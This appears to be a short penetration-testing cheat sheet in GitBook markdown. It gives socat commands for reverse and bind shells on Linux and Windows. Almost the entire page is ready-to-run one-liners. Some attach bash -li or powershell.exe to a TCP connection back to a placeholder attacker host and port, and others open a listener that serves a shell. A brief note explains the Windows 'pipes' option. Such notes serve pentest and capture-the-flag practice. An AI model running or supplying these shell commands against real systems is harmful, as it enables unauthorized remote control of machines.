# Socat

## Reverse Shell :

### Listening

```shell
socat TCP-L:<port> -
```

### Connect Back

{% tabs %}
{% tab title="Linux :" %}
```bash
socat TCP:<LOCAL-IP>:<LOCAL-PORT> EXEC:"bash -li"
```
{% endtab %}

{% tab title="Windows :" %}
```bash
socat TCP:<LOCAL-IP>:<LOCAL-PORT> EXEC:powershell.exe,pipes
```

The "pipes" option is used to force powershell (or cmd.exe) to use Unix style standard input and output.
{% endtab %}
{% endtabs %}



***

## Bind Shell :&#x20;

### Listening

```shell
socat TCP:<TARGET-IP>:<TARGET-PORT> -
```

### Connect Back

{% tabs %}
{% tab title="Linux :" %}
```bash
socat TCP-L:<PORT> EXEC:"bash -li"
```
{% endtab %}

{% tab title="Windows :" %}
```bash
socat TCP-L:<PORT> EXEC:powershell.exe,pipes
```

The "pipes" option is used to force powershell (or cmd.exe) to use Unix style standard input and output.
{% endtab %}
{% endtabs %}

